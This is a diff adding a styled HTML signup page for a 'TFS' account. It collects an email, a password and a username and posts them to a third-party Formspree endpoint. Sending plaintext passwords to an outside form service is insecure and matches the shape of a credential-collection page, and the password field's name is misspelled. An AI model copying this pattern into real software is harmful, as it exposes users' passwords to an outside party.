@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create An account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        input[type="email"],
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        textarea {
+            resize: none;
+            height: 60px;
+        }
+
+        input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .terms {
+            font-size: 12px;
+            margin-top: 10px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+
+<form action="https://formspree.io/f/xwpkldar" method="POST">
+    Create An Tfs Account:
+    <label for="email">Enter An Email with @tfs.org at the last:</label>
+    <input type="email" name="email" id="email" required>
+
+    <label for="password">Your Password for Your TFS account:</label>
+    <input type="password" name="passwor">
+
+    <label for="username">Enter A Username:</label>
+    <input type="text" name="username" id="username" required>
+
+    <label>
+        <input type="checkbox" name="terms" required> 
+        by ticking this checkbox, you agree to create an account with TFS.
+    </label>
+
+    <button type="submit">Send</button>
+</form>
+
+</body>
+</html>
